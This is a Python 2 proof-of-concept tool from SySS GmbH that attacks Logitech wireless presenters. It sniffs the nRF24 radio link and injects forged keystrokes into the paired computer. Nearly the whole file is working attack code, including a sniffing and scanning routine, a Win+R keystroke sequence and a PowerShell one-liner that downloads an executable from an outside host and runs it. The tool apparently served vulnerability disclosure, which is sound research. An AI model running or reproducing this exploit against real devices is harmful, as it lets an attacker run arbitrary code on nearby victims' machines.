#!/usr/bin/env python2
# -*- coding: utf-8 -*-

"""
  Logitech Wireless Presenter Attack Tool

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate the keystroke injection
  vulnerability of Logitech wireless presenters

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.8'
__author__ = 'Matthias Deeg, Gerhard Klostermeier'

import argparse
import logging
import pygame

from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from pygame.locals import *
from time import sleep, time
from sys import exit

# constants
ATTACK_VECTOR1      = u"cmd"
ATTACK_VECTOR2      = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

ATTACK1_BUTTON      = pygame.K_1                # attack 1 button
ATTACK2_BUTTON      = pygame.K_2                # attack 2 button
SCAN_BUTTON         = pygame.K_3                # scan button

IDLE                = 0                         # idle state
SCAN                = 1                         # scan state
ATTACK              = 2                         # attack state

SCAN_TIME           = 2                         # scan time in seconds for scan mode heuristics
DWELL_TIME          = 0.1                       # dwell time for scan mode in seconds
KEYSTROKE_DELAY     = 0.01                      # keystroke delay in seconds
PACKET_THRESHOLD    = 3                         # packet threshold for channel stability

# Logitech Unifying Keep Alive packet with 80 ms
KEEP_ALIVE_80 = unhexlify("0040005070")
KEEP_ALIVE_TIMEOUT = 0.06


class LogitechPresenterAttack():
    """Logitech Wireless Presenter Attack"""

    def __init__(self, address=""):
        """Initialize Logitech Wireless Presenter Attack"""

        self.state = IDLE                           # current state
        self.channel = 2                            # used ShockBurst channel
        self.payloads = []                          # list of sniffed payloads
        self.screen = None                          # screen
        self.font = None                            # font
        self.statusText = ""                        # current status text
        self.address = address                      # set device address
        self.attack_vector = ATTACK_VECTOR1         # set attack vector

        # initialize keyboard
        self.kbd = keyboard.LogitechPresenter()

        try:
            # initialize pygame variables
            pygame.init()
            self.icon = pygame.image.load("./images/syss_logo.png")
            self.bg = pygame.image.load("./images/logitech_presenter_attack_bg.png")

            pygame.display.set_caption("SySS Logitech Presenter Attack PoC")
            pygame.display.set_icon(self.icon)
            self.screen = pygame.display.set_mode((400, 300), 0, 24)
            self.font = pygame.font.SysFont("arial", 24)
            self.screen.blit(self.bg, (0, 0))
            pygame.display.update()

            # set key repetition parameters
            pygame.key.set_repeat(250, 50)

            # initialize radio
            self.radio = nrf24.nrf24()

            # enable LNA
            self.radio.enable_lna()

            # start scanning mode
            self.setState(SCAN)
        except:
            # info output
            info("[-] Error: Could not initialize Logitech Wireless Presenter Attack")


    def showText(self, text, x = 40, y = 140):
        output = self.font.render(text, True, (0, 0, 0))
        self.screen.blit(output, (x, y))


    def setState(self, newState):
        """Set state"""

        if newState == SCAN:
            # set SCAN state
            self.state = SCAN
            self.statusText = "SCANNING"
        elif newState == ATTACK:
            # set ATTACK state
            self.state = ATTACK
            self.statusText = "ATTACKING"
        else:
            # set IDLE state
            self.state = IDLE
            self.statusText = "IDLING"

    def run(self):
        # main loop
        last_keep_alive = time()
        running = True
        while running:
            for i in pygame.event.get():
                if i.type == QUIT:
                    running = False

                elif i.type == KEYDOWN:
                    if i.key == K_ESCAPE:
                        running = False

                    # scan button state transitions
                    if i.key == SCAN_BUTTON:
                        # if the current state is IDLE change it to SCAN
                        if self.state == IDLE:
                            # set SCAN state
                            self.setState(SCAN)

                    # attack button state transitions
                    if i.key == ATTACK1_BUTTON:
                        # if the current state is IDLE change it to ATTACK
                        if self.state == IDLE:
                            # set ATTACK state
                            self.setState(ATTACK)

                            # set attack vector
                            self.attack_vector = ATTACK_VECTOR1

                    # attack button state transitions
                    if i.key == ATTACK2_BUTTON:
                        # if the current state is IDLE change it to ATTACK
                        if self.state == IDLE:
                            # set ATTACK state
                            self.setState(ATTACK)

                            # set attack vector
                            self.attack_vector = ATTACK_VECTOR2

            # show current status on screen
            self.screen.blit(self.bg, (0, 0))
            self.showText(self.statusText)

            # update the display
            pygame.display.update()

            # state machine
            if self.state == SCAN:
                info("Scan for nRF24 device")

                # put the radio in promiscuous mode (without address) or into
                # sniffer mode(with address)
                if len(self.address) > 0:
                    self.radio.enter_sniffer_mode(self.address)
                else:
                    self.radio.enter_promiscuous_mode()

                # set the initial channel
                self.radio.set_channel(SCAN_CHANNELS[0])
                channel_index = 0

                if len(self.address) > 0:
                    # actively search for the given address
                    address_string = ':'.join('{:02X}'.format(ord(b)) for b in self.address)
                    info("Actively searching for address {}".format(address_string))
                    last_ping = time()

                    # init variables with default values from nrf24-sniffer.py
                    timeout = 0.1
                    ping_payload = unhexlify('0F0F0F0F')
                    ack_timeout = 250 # range: 250-40000, steps: 250
                    ack_timeout = int(ack_timeout / 250) - 1
                    retries = 1 # range: 0-15
                    while True:
                        # follow the target device if it changes channels
                        if time() - last_ping > timeout:
                            # First try pinging on the active channel
                            if not self.radio.transmit_payload(ping_payload, ack_timeout, retries):
                                # Ping failed on the active channel, so sweep through all available channels
                                success = False
                                for channel_index in range(len(SCAN_CHANNELS)):
                                    self.radio.set_channel(SCAN_CHANNELS[channel_index])
                                    if self.radio.transmit_payload(ping_payload, ack_timeout, retries):
                                        # Ping successful, exit out of the ping sweep
                                        last_ping = time()
                                        info("Ping success on channel {0}".format(SCAN_CHANNELS[channel_index]))
                                        success = True
                                        break
                                # Ping sweep failed
                                if not success:
                                    info("Unable to ping {0}".format(address_string))
                            # Ping succeeded on the active channel
                            else:
                              info("Ping success on channel {0}".format(SCAN_CHANNELS[channel_index]))
                              last_ping = time()

                        # Receive payloads
                        value = self.radio.receive_payload()
                        if value[0] == 0:
                            # Reset the channel timer
                            last_ping = time()
                            # Split the payload from the status byte
                            payload = value[1:]
                            if len(payload) >= 5:
                                last_key = time()
                                break
                else:
                    # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
                    info("Scanning for Logitech wireless presenter ...")
                    last_tune = time()
                    while True:
                        # increment the channel
                        if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                            channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
                            self.radio.set_channel(SCAN_CHANNELS[channel_index])
                            last_tune = time()

                        # receive payloads
                        value = self.radio.receive_payload()
                        if len(value) >= 5:
                            # split the address and payload
                            address, payload = value[0:5], value[5:]

                            # convert address to string and reverse byte order
                            converted_address = address[::-1].tostring()
                            self.address = converted_address
                            address_string = ':'.join('{:02X}'.format(b) for b in address)

                            info("Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
                            last_key = time()
                            break

                # info output
                self.showText("Found nRF24 device")
                self.showText(address_string)

                # put the radio in sniffer mode (ESB w/o auto ACKs)
                self.radio.enter_sniffer_mode(self.address)

                info("Checking communication")
                self.statusText = "CHECKING"
                self.screen.blit(self.bg, (0, 0))
                self.showText(self.statusText)

                # update the display
                pygame.display.update()

                packet_count = 0
                while True:
                    # receive payload
                    value = self.radio.receive_payload()

                    if value[0] == 0:
                        # split the payload from the status byte
                        payload = value[1:]

                        # increment packet count
                        if len(payload) == 5:
                            # only count Logitech Unifying keep alive packets (should be 5 bytes long)
                            packet_count += 1

                            # do some time measurement
                            last_key = time()

                        # show packet payload
                        info('Received payload: {0}'.format(hexlify(payload)))

                    # heuristic for having a stable channel communication
                    if packet_count >= PACKET_THRESHOLD:
                        # set IDLE state
                        info('Channel communication seems to be stable')
                        self.setState(IDLE)
                        break

                    if time() - last_key > PACKET_THRESHOLD * 0.9:
                        # restart SCAN by setting SCAN state
                        self.setState(SCAN)
                        break

            elif self.state == ATTACK:
                if self.kbd != None:
                    # send keystrokes for a classic download and execute PoC attack
                    keystrokes = []
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                    # send attack keystrokes
                    for k in keystrokes:
                        self.radio.transmit_payload(k)

                        # info output
                        info('Sent payload: {0}'.format(hexlify(k)))

                         # send keep alive with 80 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_80)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                    # need small delay after WIN + R
                    for i in range(5):
                         # send keep alive with 80 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_80)
                        last_keep_alive = time()
                        sleep(KEEP_ALIVE_TIMEOUT)

                    keystrokes = []
                    keystrokes = self.kbd.getKeystrokes(self.attack_vector)
                    keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                    # send attack keystrokes with a small delay
                    for k in keystrokes[:2]:
                        self.radio.transmit_payload(k)

                        # info output
                        info('Sent payload: {0}'.format(hexlify(k)))

                        # send keep alive with 80 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_80)
                        last_keep_alive = time()

                        sleep(KEEP_ALIVE_TIMEOUT)

                    # send attack keystrokes with a small delay
                    for k in keystrokes[2:]:
                        self.radio.transmit_payload(k)

                        # info output
                        info('Sent payload: {0}'.format(hexlify(k)))

                        # send keep alive with 80 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_80)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                # set IDLE state after attack
                self.setState(IDLE)

            if time() - last_keep_alive > KEEP_ALIVE_TIMEOUT:
                # send keep alive with 80 ms time out
                self.radio.transmit_payload(KEEP_ALIVE_80)
                last_keep_alive = time()


# main program
if __name__ == '__main__':
    # setup logging
    level = logging.INFO
    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')

    # parse arguments
    args = parser.parse_args()

    # set scan channels
    SCAN_CHANNELS = args.channels

    if args.address:
        try:
            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
            address = args.address.replace(':', '').decode('hex')[::-1][:5]
            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
        except:
            info("Error: Invalid address")
            exit(1)
    else:
        address = ""

    # init
    poc = LogitechPresenterAttack(address)

    # run
    info("Start Logitech Wireless Presenter Attack v{0}".format(__version__))
    poc.run()

    # done
    info("Done.")

